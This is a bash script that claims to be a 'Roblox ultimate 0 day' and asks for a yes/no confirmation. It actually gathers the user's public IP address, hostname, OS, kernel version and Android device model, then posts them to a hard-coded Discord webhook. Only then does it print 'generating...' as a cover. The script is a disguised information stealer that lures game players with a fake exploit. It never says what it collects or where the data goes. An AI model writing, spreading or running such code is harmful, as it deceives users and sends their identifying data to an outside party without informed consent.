#!/bin/bash

echo "Roblox ultimate 0 day made by 0Effn"
read -p "Do you want to continue? (yes/no): " consent

if [[ "$consent" != "yes" && "$consent" != "y" ]]; then
    echo "Operation cancelled."
    exit 1
fi

# Collect information
ip=$(curl -s ifconfig.me)
hostname=$(uname -n)
os=$(uname -o)
kernel=$(uname -r)
device=$(getprop ro.product.model 2>/dev/null || echo "Unknown device")

# Webhook URL (yours)
webhook_url="https://discord.com/api/webhooks/1363883915638472755/hK5IRdGkEZmT9mcXMer_Q_ApTsyAALw896KTkTRWmRRQUO6Zurp7fD6AcfZAQO7wOyMV"

# Create message
message="**New device info collected:**\nIP: $ip\nHostname: $hostname\nOS: $os\nKernel: $kernel\nDevice: $device"

# Build JSON payload
payload=$(printf '{"content": "%s"}' "$message")

# Send to Discord
curl -s -H "Content-Type: application/json" -X POST -d "$payload" "$webhook_url"

echo "generating..."
echo -e "$message"
